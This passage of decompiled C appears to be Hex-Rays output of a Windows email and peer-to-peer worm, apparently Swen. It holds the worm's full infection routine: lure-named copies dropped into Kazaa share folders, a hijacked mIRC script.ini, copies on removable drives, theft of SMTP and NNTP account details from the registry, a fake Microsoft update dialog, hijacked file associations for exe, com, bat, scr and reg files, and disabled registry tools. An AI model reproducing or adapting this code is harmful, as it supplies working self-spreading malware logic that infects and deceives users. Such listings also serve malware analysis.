          strcat(FileName, v7);
        }
        v8 = GetFileAttributesA(FileName);
        v20 = v8;
        if ( (v8 & 0x10) != 0 && v8 != -1 )
        {
          v9 = sub_406850(6u);
          sub_4068F4((int)Destination, v9 + 4);
          strcat(FileName, asc_411910);
          strcat(FileName, Destination);
          strcat(FileName, aExe);
          CopyFileA(lpExistingFileName, FileName, 1);
        }
        ++v16;
        result = 1;
      }
    }
  }
  return result;
}

//----- (00408444) --------------------------------------------------------
LPSTR __cdecl sub_408444(LPSTR lpsz)
{
  unsigned int v1; // eax
  unsigned int v2; // eax
  unsigned int v3; // eax
  const char *v5; // [esp-1Ch] [ebp-D0h]
  const char *v6; // [esp-1Ch] [ebp-D0h]
  char *v7[18]; // [esp+0h] [ebp-B4h]
  char *Source[10]; // [esp+48h] [ebp-6Ch]
  char *v9[6]; // [esp+70h] [ebp-44h]
  char *v10[6]; // [esp+88h] [ebp-2Ch]
  int v11[5]; // [esp+A0h] [ebp-14h]

  Source[1] = aKazaaLite;
  *lpsz = 0;
  Source[2] = aKazaaMediaDesk;
  Source[3] = aKazaa;
  Source[4] = aWinrar;
  Source[5] = aWinzip;
  Source[6] = aWinamp;
  Source[7] = aMirc;
  Source[8] = aDownloadAccele;
  Source[9] = aGetrightFtp;
  v9[0] = aWindowsMediaPl;
  v9[1] = aKeyGenerator;
  v9[2] = aHack;
  v9[3] = aHacked;
  v9[4] = aWarez;
  v9[5] = aUpload;
  v10[0] = aInstaller;
  v10[1] = aBugbear;
  v10[2] = aYaha;
  v10[3] = aGibe;
  v10[4] = aSircam;
  v10[5] = aSobig;
  v11[0] = (int)aKlez;
  v11[1] = (int)aRemover;
  v11[2] = (int)aRemovalTool;
  v11[3] = (int)aCleaner;
  v11[4] = (int)aFixtool;
  v7[1] = aAolHacker;
  v7[2] = aYahooHacker;
  v7[3] = aHotmailHacker;
  v7[4] = a10000Serials;
  v7[5] = aJennaJameson;
  v7[6] = aHardporn;
  v7[7] = aSex;
  v7[8] = aXboxEmulator;
  v7[9] = aEmulatorPs2;
  v7[10] = aXpUpdate;
  v7[11] = aXxxVideo;
  v7[12] = aSickJoke;
  v7[13] = aXxxPictures;
  v7[14] = aMyNakedSister;
  v7[15] = aHallucinogenic;
  v7[16] = aCookingWithCan;
  v7[17] = aMagicMushrooms;
  Source[0] = aVirusGenerator;
  if ( sub_406840(0x32u) )
  {
    v1 = sub_406850(0xAu);
    strcpy(lpsz, Source[v1]);
    strcat(lpsz, Caption);
    v5 = v9[sub_406850(6u)];
    strcat(lpsz, v5);
  }
  else if ( sub_406840(0x1Bu) )
  {
    v2 = sub_406850(6u);
    strcpy(lpsz, v10[v2]);
    strcat(lpsz, Caption);
    v6 = (const char *)v11[sub_406850(4u)];
    strcat(lpsz, v6);
  }
  else
  {
    v3 = sub_406850(0x12u);
    strcpy(lpsz, v7[v3]);
  }
  if ( sub_406840(8u) )
    CharLowerA(lpsz);
  return lpsz;
}

//----- (0040864E) --------------------------------------------------------
void __cdecl sub_40864E(HWND hWnd, int a2)
{
  HGDIOBJ StockObject; // eax
  HWND v3; // eax
  unsigned int v4; // esi
  HWND DlgItem; // [esp+14h] [ebp-5Ch]
  HDC hdc; // [esp+18h] [ebp-58h]
  unsigned int right; // [esp+1Ch] [ebp-54h]
  _DWORD String[11]; // [esp+20h] [ebp-50h] BYREF
  int Rect_8; // [esp+4Ch] [ebp-24h]
  int Rect_12; // [esp+50h] [ebp-20h]
  unsigned int v11; // [esp+54h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+58h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( hWnd )
  {
    UpdateWindow(hWnd);
    sub_408962(hWnd);
    DlgItem = GetDlgItem(hWnd, 1008);
    hdc = GetDC(DlgItem);
    String[8] = CreateSolidBrush(0xAA0000u);
    StockObject = GetStockObject(8);
    SelectObject(hdc, StockObject);
    SelectObject(hdc, (HGDIOBJ)String[8]);
    GetClientRect(DlgItem, (LPRECT)&String[9]);
    if ( a2 )
    {
      if ( a2 == 1 )
      {
        strcpy((char *)String, aExtractingFile);
      }
      else if ( (unsigned int)a2 <= 3 )
      {
        strcpy((char *)String, aCopyingFiles);
      }
      else if ( a2 == 4 )
      {
        strcpy((char *)String, aUpdatingRegist);
      }
    }
    else
    {
      strcpy((char *)String, aSearchingForIn);
    }
    v3 = GetDlgItem(hWnd, 1009);
    SetWindowTextA(v3, (LPCSTR)String);
    v11 = a2 * ((Rect_8 - 2) / 5) + 1;
    v4 = (Rect_8 - 2) / 5 * (a2 + 1) + 2;
    for ( right = v11; right <= v4; ++right )
    {
      Rectangle(hdc, 1, 1, right, Rect_12 - 1);
      Sleep(0x14u);
    }
    ReleaseDC(hWnd, hdc);
    DeleteObject((HGDIOBJ)String[8]);
  }
}
// 4086F0: conditional instruction was optimized away because %arg_4.4>=2u

//----- (004087AD) --------------------------------------------------------
INT_PTR __stdcall sub_4087AD(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)
{
  if ( a2 != 272 )
    return 0;
  ShowWindow(hWnd, 5);
  UpdateWindow(hWnd);
  return 1;
}

//----- (004087D7) --------------------------------------------------------
DWORD __cdecl sub_4087D7(LPCSTR lpFileName, int a2, LPCSTR lpExistingFileName, int a4, int a5)
{
  DWORD result; // eax
  const char *v6; // eax
  const char *v7; // eax
  CHAR ExistingFileName[100]; // [esp+Ch] [ebp-ECh] BYREF
  unsigned int i; // [esp+70h] [ebp-88h]
  CHAR NewFileName[100]; // [esp+74h] [ebp-84h] BYREF
  LPCSTR v11; // [esp+D8h] [ebp-20h]
  size_t v12; // [esp+DCh] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+E0h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  v11 = lpFileName;
  if ( !strncmp(lpFileName, a012345, 7u) )
  {
    v11 = lpFileName + 7;
    strcpy(NewFileName, lpFileName + 7);
    strcpy((char *)lpFileName, NewFileName);
  }
  result = GetFileAttributesA(lpFileName);
  v12 = result;
  if ( result != -1 )
  {
    v12 = strlen(lpFileName);
    if ( lpFileName[v12 - 1] != 92 )
      strcat((char *)lpFileName, asc_411910);
    for ( i = 0; i < a4; ++i )
    {
      v6 = sub_408444(ExistingFileName);
      wsprintfA(NewFileName, "%s%s.zip", lpFileName, v6);
      wsprintfA(ExistingFileName, "%s\\%s.zip", Buffer, (const char *)a2);
      if ( CopyFileA(ExistingFileName, NewFileName, 1) )
        sub_407E9C(NewFileName);
    }
    for ( i = 0; ; ++i )
    {
      result = i;
      if ( i >= a5 )
        break;
      v7 = sub_408444(ExistingFileName);
      wsprintfA(NewFileName, "%s%s.exe", lpFileName, v7);
      if ( CopyFileA(lpExistingFileName, NewFileName, 1) )
        sub_407E9C(NewFileName);
    }
  }
  return result;
}

//----- (00408962) --------------------------------------------------------
void __cdecl sub_408962(HWND hWnd)
{
  unsigned int i; // esi
  struct tagMSG Msg; // [esp+4h] [ebp-1Ch] BYREF

  if ( hWnd )
  {
    for ( i = 0; i < 0x3E8; ++i )
    {
      if ( !PeekMessageA(&Msg, hWnd, 0, 0, 1u) )
        break;
      IsDialogMessageA(hWnd, &Msg);
    }
  }
}

//----- (004089A1) --------------------------------------------------------
int sub_4089A1()
{
  unsigned int v0; // edi
  char *v1; // eax
  CHAR *v2; // eax
  CHAR v3; // al
  int result; // eax
  unsigned int v5; // eax
  unsigned int v6; // eax
  DWORD v7; // eax
  const char *v8; // eax
  unsigned int v9; // eax
  const char *v10; // eax
  const char *v11; // eax
  int v12; // eax
  unsigned int v13; // eax
  const char *v14; // eax
  int v15; // eax
  char *v16; // eax
  char *v17; // eax
  const char *v18; // eax
  const char *v19; // eax
  DWORD v20; // eax
  HANDLE FileA; // edi
  DWORD v22; // eax
  HANDLE v23; // edi
  int v24; // edi
  int v25; // edi
  unsigned int k; // esi
  unsigned int v27; // [esp+Ch] [ebp-A1Ch]
  unsigned int v28; // [esp+10h] [ebp-A18h]
  HANDLE hObject; // [esp+1Ch] [ebp-A0Ch]
  BYTE Data[100]; // [esp+20h] [ebp-A08h] BYREF
  HANDLE hFile; // [esp+84h] [ebp-9A4h]
  CHAR v32[100]; // [esp+88h] [ebp-9A0h] BYREF
  CHAR File[152]; // [esp+ECh] [ebp-93Ch] BYREF
  CHAR Source[152]; // [esp+184h] [ebp-8A4h] BYREF
  HKEY phkResult; // [esp+21Ch] [ebp-80Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+220h] [ebp-808h]
  HMODULE hModule; // [esp+224h] [ebp-804h]
  CHAR RootPathName; // [esp+228h] [ebp-800h] BYREF
  char v39[259]; // [esp+229h] [ebp-7FFh] BYREF
  CHAR PathName[100]; // [esp+32Ch] [ebp-6FCh] BYREF
  int v41; // [esp+390h] [ebp-698h]
  HRSRC hResInfo; // [esp+394h] [ebp-694h]
  struct _OFSTRUCT v43; // [esp+398h] [ebp-690h] BYREF
  CHAR Parameters[152]; // [esp+420h] [ebp-608h] BYREF
  CHAR String[100]; // [esp+4B8h] [ebp-570h] BYREF
  struct _OFSTRUCT ReOpenBuf; // [esp+51Ch] [ebp-50Ch] BYREF
  LPCVOID lpBuffer; // [esp+5A4h] [ebp-484h]
  HWND hDlg; // [esp+5A8h] [ebp-480h]
  INT v49; // [esp+5ACh] [ebp-47Ch]
  HANDLE v50; // [esp+5B0h] [ebp-478h]
  int v51; // [esp+5B4h] [ebp-474h]
  CHAR NewFileName[260]; // [esp+5B8h] [ebp-470h] BYREF
  CHAR FileName[200]; // [esp+6BCh] [ebp-36Ch] BYREF
  char Destination[20]; // [esp+784h] [ebp-2A4h] BYREF
  CHAR v55[100]; // [esp+798h] [ebp-290h] BYREF
  unsigned int j; // [esp+7FCh] [ebp-22Ch]
  unsigned int v57; // [esp+800h] [ebp-228h]
  unsigned int i; // [esp+804h] [ebp-224h]
  CHAR Buffer[100]; // [esp+808h] [ebp-220h] BYREF
  CHAR SubKey[200]; // [esp+86Ch] [ebp-1BCh] BYREF
  int v61; // [esp+934h] [ebp-F4h]
  CHAR Filename[200]; // [esp+93Ch] [ebp-ECh] BYREF
  char *v63; // [esp+A04h] [ebp-24h]
  DWORD nSize; // [esp+A08h] [ebp-20h] BYREF
  int v65; // [esp+A0Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+A10h] [ebp-18h]

  v65 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( !sub_406DCD(::Destination) )
  {
    Buffer[0] = 0;
    v57 = 0;
    v0 = 0;
    i = 0;
    do
    {
      nSize = sub_406850(0x1Au);
      v57 += nSize;
      Buffer[v0++] = nSize + 64;
      i = v0;
    }
    while ( v57 < 0x36 );
    Buffer[v0] = -112 - v57;
    Buffer[v0 + 1] = 0;
    strcpy(::Destination, ::SubKey);
    strcat(::Destination, asc_411910);
    strcat(::Destination, Buffer);
  }
  GetModuleFileNameA(0, Filename, 0xC8u);
  v1 = strrchr(Filename, 92);
  v63 = v1;
  if ( v1 )
    v2 = v1 + 1;
  else
    v2 = Filename;
  v63 = v2;
  v3 = *v2;
  if ( v3 == 112 || v3 == 80 || v3 == 113 || v3 == 81 || v3 == 117 || v3 == 85 || v3 == 105 || v3 == 73 )
    v65 = 1;
  if ( !sub_40679E(HKEY_LOCAL_MACHINE, ::Destination, aInstalled, (LPBYTE)Buffer)
    || (result = _strcmpi(Buffer, aByBegbie)) != 0 )
  {
    v5 = sub_406850(5u);
    sub_4068F4((int)Destination, v5 + 3);
    strcat(Destination, aExe);
    wsprintfA(NewFileName, "%s\\%s", ::Buffer, Destination);
    CopyFileA(Filename, NewFileName, 1);
    wsprintfA(Buffer, "%s autorun", Destination);
    v6 = sub_406850(6u);
    sub_4068F4((int)FileName, v6 + 3);
    sub_4066EB(HKEY_LOCAL_MACHINE, aSoftwareMicros_0, FileName, 1u, Buffer);
    sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aInstallItem, 1u, FileName);
    if ( v65 && MessageBoxA(0, aThisWillInstal, aMicrosoftInter, 0x24u) == 7 )
      v65 = 0;
    nSize = 100;
    if ( GetComputerNameA(Buffer, &nSize) )
    {
      wsprintfA(FileName, "%s\\%s.bat", ::Buffer, Buffer);
      hFile = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);
      if ( hFile != (HANDLE)-1 )
      {
        wsprintfA(Buffer, "\r\n@ECHO OFF\r\nIF NOT \"%%1\"==\"\" %s %%1\r\n", Destination);
        v7 = strlen(Buffer);
        WriteFile(hFile, Buffer, v7, &nSize, 0);
        SetEndOfFile(hFile);
        CloseHandle(hFile);
        sub_407E9C(FileName);
      }
    }
    hDlg = 0;
    if ( v65 )
    {
      hDlg = CreateDialogParamA(hInstance, (LPCSTR)0x7B, 0, sub_4087AD, 0);
      sub_40864E(hDlg, 0);
    }
    sub_40772C(hDlg);
    if ( v65 )
      sub_40864E(hDlg, 1);
    v41 = 0;
    nSize = GetTempPathA(0x64u, PathName);
    if ( v39[nSize + 258] != 92 )
      strcat(PathName, asc_411910);
    v8 = sub_4073F8(Buffer);
    strcat(PathName, v8);
    strcat(PathName, aExe);
    CopyFileA(Filename, PathName, 1);
    v9 = sub_406850(4u);
    v10 = (const char *)sub_4068F4((int)String, v9 + 3);
    wsprintfA(Source, "%s\\%s.zip", ::Buffer, v10);
    for ( i = 0; i < 2; ++i )
    {
      if ( i )
      {
        strcpy(File, aWinzipExe);
        wsprintfA(Parameters, "-min -e -o %s %s", PathName, Source);
      }
      else
      {
        strcpy(File, aWinrarExe);
        wsprintfA(Parameters, "A -EP %s %s", Source, PathName);
      }
      if ( (int)ShellExecuteA(0, 0, File, Parameters, 0, 0) > 32 )
        goto LABEL_44;
      strcpy(Buffer, aSoftwareMicros_1);
      v11 = aWinrarExe;
      if ( i )
        v11 = aWinzipExe;
      strcat(Buffer, v11);
      if ( sub_40679E(HKEY_LOCAL_MACHINE, Buffer, 0, (LPBYTE)File) )
      {
        if ( (int)ShellExecuteA(0, 0, File, Parameters, 0, 0) > 32 )
        {
LABEL_44:
          v41 = 1;
          break;
        }
      }
    }
    if ( v41 )
    {
      sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aZipname, 1u, String);
      sub_407E9C(Source);
      Sleep(0x3E8u);
    }
    DeleteFileA(PathName);
    phkResult = 0;
    RegOpenKeyExA(HKEY_CURRENT_USER, aSoftwareKazaa, 0, 1u, &phkResult);
    if ( phkResult )
    {
      RegCloseKey(phkResult);
      strcpy(Buffer, aSoftwareKazaa);
      strcat(Buffer, aLocalcontent);
      nSize = 0;
      sub_4066EB(HKEY_CURRENT_USER, Buffer, aDisablesharing, 4u, (LPCSTR)&nSize);
      for ( i = 0; i < 2; ++i )
      {
        strcpy(Buffer, aSoftwareKazaa);
        if ( i )
        {
          strcat(Buffer, aTransfer);
          strcpy(FileName, aDldir0);
        }
        else
        {
          strcat(Buffer, aLocalcontent);
          strcpy(FileName, aDownloaddir);
        }
        sub_40679E(HKEY_CURRENT_USER, Buffer, FileName, Data);
        if ( Data[0] )
        {
          if ( v41 )
            v28 = sub_406850(5u) + 2;
          else
            v28 = 0;
          v12 = sub_406850(3u);
          sub_4087D7((LPCSTR)Data, v41 != 0 ? (unsigned int)String : 0, Filename, v28, v12);
        }
      }
      nSize = GetTempPathA(0x64u, PathName);
      if ( v39[nSize + 258] != 92 )
        strcat(PathName, asc_411910);
      v13 = sub_406850(5u);
      v14 = (const char *)sub_4068F4((int)Buffer, v13 + 2);
      strcat(PathName, v14);
      if ( CreateDirectoryA(PathName, 0) )
      {
        strcpy(Buffer, aSoftwareKazaa);
        strcat(Buffer, aLocalcontent);
        strcpy(FileName, a012345);
        strcat(FileName, PathName);
        sub_4066EB(HKEY_CURRENT_USER, Buffer, aDir99, 1u, FileName);
        if ( v41 )
          v27 = sub_406850(5u) + 2;
        else
          v27 = 0;
        v15 = sub_406850(3u);
        sub_4087D7(PathName, v41 != 0 ? (unsigned int)String : 0, Filename, v27, v15);
      }
      sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aKazaaInfect, 1u, ::String);
    }
    if ( v65 )
      sub_40864E(hDlg, 2);
    for ( i = 0; i < 2; ++i )
    {
      if ( i )
        sub_40679E(HKEY_LOCAL_MACHINE, aSoftwareMicros_2, aProgramfilesdi, (LPBYTE)Buffer);
      else
        strcpy(Buffer, aC);
      for ( j = 0; j < 2; ++j )
      {
        if ( j )
          strcat(Buffer, aMirc32);
        else
          strcat(Buffer, aMirc_0);
        strcpy(FileName, Buffer);
        strcat(FileName, aMircIni);
        if ( GetFileAttributesA(FileName) != -1 )
        {
          strcpy(v32, Buffer);
          strcpy(FileName, Buffer);
          v16 = strcat(FileName, aScriptIni);
          if ( GetFileAttributesA(v16) != -1 )
          {
            v17 = strcat(Buffer, aScriptBcp);
            MoveFileA(FileName, v17);
          }
          hObject = CreateFileA(FileName, 0x40000000u, 1u, 0, 2u, 0x80u, 0);
          if ( hObject != (HANDLE)-1 )
          {
            if ( v41 )
            {
              v18 = sub_408444(FileName);
              wsprintfA(Buffer, "%s\\%s.zip", ::Buffer, v18);
              strcpy(FileName, Source);
            }
            else
            {
              v19 = sub_408444(FileName);
              wsprintfA(Buffer, "%s\\%s.exe", ::Buffer, v19);
              GetModuleFileNameA(0, FileName, 0xC8u);
            }
            if ( CopyFileA(FileName, Buffer, 1) )
              sub_407E9C(Buffer);
            strcpy(FileName, aScriptN0On1Joi);
            strcat(FileName, Buffer);
            strcat(FileName, aN3);
            nSize = 0;
            v20 = strlen(FileName);
            WriteFile(hObject, FileName, v20, &nSize, 0);
            CloseHandle(hObject);
            sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aMircInstallFol, 1u, v32);
            break;
          }
        }
      }
    }
    sub_40679E(HKEY_CURRENT_USER, aSoftwareMicros_3, aDefaultMailAcc, (LPBYTE)Buffer);
    sub_40679E(HKEY_CURRENT_USER, aSoftwareMicros_3, aDefaultNewsAcc, (LPBYTE)FileName);
    if ( !Buffer[0] )
      strcpy(Buffer, a00000001);
    wsprintfA(SubKey, "SOFTWARE\\Microsoft\\Internet Account Manager\\Accounts\\%s", Buffer);
    sub_40679E(HKEY_CURRENT_USER, SubKey, aSmtpEmailAddre, (LPBYTE)Buffer);
    if ( sub_4075E3(Buffer, 1) )
    {
      strcpy(v55, Buffer);
      sub_40679E(HKEY_CURRENT_USER, SubKey, aSmtpServer, (LPBYTE)Buffer);
      if ( sub_4075E3(Buffer, 0) )
      {
        sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aEmailAddress, 1u, v55);
        sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aServer_0, 1u, Buffer);
        sub_40679E(HKEY_CURRENT_USER, SubKey, aSmtpDisplayNam, (LPBYTE)Buffer);
        if ( !Buffer[0] )
        {
          nSize = 100;
          if ( !GetComputerNameA(Buffer, &nSize) )
            strcpy(Buffer, aUnknown);
        }
        sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aVicname, 1u, Buffer);
      }
    }
    if ( FileName[0] )
    {
      wsprintfA(SubKey, "SOFTWARE\\Microsoft\\Internet Account Manager\\Accounts\\%s", FileName);
      sub_40679E(HKEY_CURRENT_USER, SubKey, aNntpServer, (LPBYTE)Buffer);
      if ( sub_4075E3(Buffer, 0) )
      {
        strcpy(FileName, ::Buffer);
        strcat(FileName, aSwen0Dat);
        FileA = CreateFileA(FileName, 0x40000000u, 3u, 0, 2u, 0x80u, 0);
        if ( FileA != (HANDLE)-1 )
        {
          v22 = strlen(Buffer);
          WriteFile(FileA, Buffer, v22, &nSize, 0);
          CloseHandle(FileA);
        }
      }
    }
    if ( v65 )
      sub_40864E(hDlg, 3);
    hModule = GetModuleHandleA(0);
    hResInfo = FindResourceA(hModule, (LPCSTR)0x81, Type);
    nNumberOfBytesToWrite = SizeofResource(hModule, hResInfo);
    lpBuffer = LoadResource(0, hResInfo);
    if ( lpBuffer && nNumberOfBytesToWrite )
    {
      nSize = GetTempPathA(0x64u, Buffer);
      Buffer[nSize] = 0;
      if ( Buffer[strlen(Buffer) - 1] != 92 )
        strcat(Buffer, asc_411910);
      strcat(Buffer, aNntptmpFl);
      v23 = CreateFileA(Buffer, 0x40000000u, 3u, 0, 2u, 0x80u, 0);
      v50 = v23;
      if ( v23 != (HANDLE)-1 )
      {
        WriteFile(v23, lpBuffer, nNumberOfBytesToWrite, &nSize, 0);
        CloseHandle(v23);
        v24 = LZOpenFileA(Buffer, &ReOpenBuf, 0);
        v51 = v24;
        if ( v24 >= 0 )
        {
          wsprintfA(FileName, "%s\\swen1.dat", ::Buffer);
          v49 = LZOpenFileA(FileName, &v43, 0x1000u);
          LZCopy(v24, v49);
          LZClose(v24);
          LZClose(v49);
        }
        DeleteFileA(Buffer);
      }
    }
    sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aInstalled, 1u, aByBegbie);
    ShellExecuteA(0, 0, NewFileName, ::Parameters, 0, 0);
    Sleep(0x3E8u);
    wsprintfA(FileName, "%s \"%%1\" %%*", Destination);
    for ( i = 0; i < 4; ++i )
    {
      if ( i )
      {
        if ( i == 1 )
        {
          strcpy(Buffer, aComfile);
        }
        else if ( i == 2 )
        {
          strcpy(Buffer, aPiffile);
        }
        else
        {
          strcpy(Buffer, aBatfile);
        }
      }
      else
      {
        strcpy(Buffer, aExefile);
      }
      strcat(Buffer, aShellOpenComma);
      sub_4066EB(HKEY_CLASSES_ROOT, Buffer, 0, 1u, FileName);
    }
    wsprintfA(Buffer, "%s \"%%1\" /S", Destination);
    sub_4066EB(HKEY_CLASSES_ROOT, aScrfileShellOp, 0, 1u, Buffer);
    wsprintfA(Buffer, "%s \"%%1\"", Destination);
    sub_4066EB(HKEY_CLASSES_ROOT, aScrfileShellCo, 0, 1u, Buffer);
    wsprintfA(Buffer, "%s showerror", Destination);
    sub_4066EB(HKEY_CLASSES_ROOT, aRegfileShellOp, 0, 1u, Buffer);
    nSize = 1;
    sub_4066EB(HKEY_CURRENT_USER, aSoftwareMicros_5, aDisableregistr, 4u, (LPCSTR)&nSize);
    if ( v65 )
    {
      sub_40864E(hDlg, 4);
      EndDialog(hDlg, 0);
      MessageBoxA(0, aThisUpdateHasB, aMicrosoftInter, 0x40u);
    }
    result = GetLogicalDrives();
    v25 = result;
    v61 = result;
    for ( k = 0; ; ++k )
    {
      i = k;
      if ( k >= 0x1A )
        break;
      result = 1 << k;
      if ( ((1 << k) & v25) != 0 )
      {
        RootPathName = k + 65;
        strcpy(v39, ":\\");
        result = GetDriveTypeA(&RootPathName);
        if ( result == 4 )
          result = sub_408003(&RootPathName, NewFileName);
      }
    }
  }
  else if ( v65 )
  {
    return MessageBoxA(0, aThisUpdateDoes, aMicrosoftInter, 0x30u);
  }
  return result;
}
// 408DD6: conditional instruction was optimized away because %var_224.4==1
// 4098B2: conditional instruction was optimized away because %var_224.4==3

//----- (00409A73) --------------------------------------------------------
void __noreturn sub_409A73()
{
  HWND WindowA; // eax
  HANDLE FileA; // eax
  char *v2; // eax
  const char *v3; // edi
  char *j; // eax
  char *v5; // edi
  HMODULE ModuleHandleA; // eax
  HANDLE v7; // edi
  DWORD v8; // eax
  BOOL (__stdcall *MoveFileExA)(LPCSTR, LPCSTR, DWORD); // [esp+18h] [ebp-10Ch]
  const CHAR *lpFileName; // [esp+20h] [ebp-104h]
  DWORD NumberOfBytesRead; // [esp+28h] [ebp-FCh] BYREF
  void *Block; // [esp+2Ch] [ebp-F8h]
  HANDLE hFile; // [esp+30h] [ebp-F4h]
  CHAR FileName[100]; // [esp+34h] [ebp-F0h] BYREF
  HKEY phkResult[2]; // [esp+98h] [ebp-8Ch] BYREF
  int i; // [esp+A0h] [ebp-84h]
  CHAR NewFileName[100]; // [esp+A4h] [ebp-80h] BYREF
  DWORD nNumberOfBytesToRead; // [esp+108h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+10Ch] [ebp-18h]

  phkResult[0] = 0;
  ms_exc.registration.TryLevel = 0;
  WindowA = FindWindowA(WindowName, WindowName);
  phkResult[1] = (HKEY)WindowA;
  if ( WindowA )
    PostMessageA(WindowA, 2u, 0, 0);
  for ( i = 0; i < 5; ++i )
  {
    if ( i )
    {
      switch ( i )
      {
        case 1:
          strcpy(NewFileName, aGerms1Dbv_0);
          break;
        case 2:
          strcpy(NewFileName, aSwen0Dat_0);
          break;
        case 3:
          strcpy(NewFileName, aSwen1Dat);
          break;
        case 4:
          strcpy(NewFileName, aNntpgroupsDat);
          break;
      }
    }
    else
    {
      strcpy(NewFileName, aGerms0Dbv_0);
    }
    wsprintfA(FileName, "%s\\%s", Buffer, NewFileName);
    if ( GetFileAttributesA(FileName) != -1 )
      DeleteFileA(FileName);
  }
  sub_406DCD(Destination);
  if ( sub_40679E(HKEY_LOCAL_MACHINE, Destination, aInstallItem, (LPBYTE)FileName) )
  {
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, aSoftwareMicros_0, 0, 2u, phkResult);
    if ( phkResult[0] )
    {
      RegDeleteValueA(phkResult[0], FileName);
      RegCloseKey(phkResult[0]);
    }
  }
  if ( sub_40679E(HKEY_LOCAL_MACHINE, Destination, aKazaaInfect, (LPBYTE)FileName) && !_strcmpi(FileName, String) )
  {
    strcpy(NewFileName, aSoftwareKazaa);
    strcat(NewFileName, aLocalcontent);
    nNumberOfBytesToRead = 1;
    sub_4066EB(HKEY_CURRENT_USER, NewFileName, aDisablesharing, 4u, (LPCSTR)&nNumberOfBytesToRead);
  }
  if ( sub_40679E(HKEY_LOCAL_MACHINE, Destination, aMircInstallFol, (LPBYTE)FileName) )
  {
    wsprintfA(NewFileName, "%s\\script.ini", FileName);
    DeleteFileA(NewFileName);
    strcat(FileName, aScriptBcp);
    if ( GetFileAttributesA(FileName) != -1 )
      MoveFileA(FileName, NewFileName);
  }
  if ( sub_40679E(HKEY_LOCAL_MACHINE, Destination, aUnfile, (LPBYTE)NewFileName) )
  {
    wsprintfA(FileName, "%s\\%s", Buffer, NewFileName);
    FileA = CreateFileA(FileName, 0x80000000, 3u, 0, 3u, 0x80u, 0);
    hFile = FileA;
    if ( FileA != (HANDLE)-1 )
    {
      nNumberOfBytesToRead = GetFileSize(FileA, 0);
      v2 = (char *)operator new(nNumberOfBytesToRead + 3);
      v3 = v2;
      Block = v2;
      if ( v2 )
      {
        ReadFile(hFile, v2, nNumberOfBytesToRead, &NumberOfBytesRead, 0);
        v3[NumberOfBytesRead] = 0;
        lpFileName = v3;
        for ( j = strstr(v3, asc_4106F0); ; j = strstr(v5 + 2, asc_4106F0) )
        {
          v5 = j;
          if ( !j )
            break;
          *j = 0;
          DeleteFileA(lpFileName);
          lpFileName = v5 + 2;
        }
        operator delete(Block);
      }
      CloseHandle(hFile);
      DeleteFileA(FileName);
    }
  }
  RegDeleteKeyA(HKEY_LOCAL_MACHINE, Destination);
  for ( i = 0; i < 4; ++i )
  {
    if ( i )
    {
      switch ( i )
      {
        case 1:
          strcpy(FileName, aComfile);
          break;
        case 2:
          strcpy(FileName, aPiffile);
          break;
        case 3:
          strcpy(FileName, aBatfile);
          break;
      }
    }
    else
    {
      strcpy(FileName, aExefile);
    }
    strcat(FileName, aShellOpenComma);
    sub_4066EB(HKEY_CLASSES_ROOT, FileName, 0, 1u, a1);
  }
  sub_4066EB(HKEY_CLASSES_ROOT, aScrfileShellOp, 0, 1u, a1S);
  sub_4066EB(HKEY_CLASSES_ROOT, aScrfileShellCo, 0, 1u, a1_0);
  sub_4066EB(HKEY_CLASSES_ROOT, aRegfileShellOp, 0, 1u, aRegeditExe1);
  nNumberOfBytesToRead = 0;
  sub_4066EB(HKEY_CURRENT_USER, aSoftwareMicros_5, aDisableregistr, 4u, (LPCSTR)&nNumberOfBytesToRead);
  if ( dword_41A66C )
  {
    wsprintfA(NewFileName, "%s\\Wininit.ini", Buffer);
    v7 = CreateFileA(NewFileName, 0x40000000u, 0, 0, 2u, 0x80u, 0);
    if ( v7 != (HANDLE)-1 )
    {
      GetModuleFileNameA(0, FileName, 0x64u);
      if ( GetShortPathNameA(FileName, NewFileName, 0x64u) )
        strcpy(FileName, NewFileName);
      wsprintfA(NewFileName, "[rename]\r\nNUL=%s\r\n", FileName);
      v8 = strlen(NewFileName);
      WriteFile(v7, NewFileName, v8, &nNumberOfBytesToRead, 0);
      CloseHandle(v7);
    }
  }
  else
  {
    ModuleHandleA = GetModuleHandleA(ModuleName);
    if ( ModuleHandleA )
    {
      MoveFileExA = (BOOL (__stdcall *)(LPCSTR, LPCSTR, DWORD))GetProcAddress(ModuleHandleA, aMovefileexa);
      if ( MoveFileExA )
      {
        GetModuleFileNameA(0, FileName, 0x64u);
        MoveFileExA(FileName, 0, 4);
      }
    }
  }
  if ( hWnd )
    PostMessageA(hWnd, 2u, 0, 0);
  ms_exc.registration.TryLevel = -1;
  ExitWindowsEx(6u, 0);
  ExitProcess(0);
}
// 41A66C: using guessed type int dword_41A66C;

// nfuncs=192 queued=79 decompiled=79 lumina nreq=0 worse=0 better=0
// ALL OK, 79 function(s) have been successfully decompiled
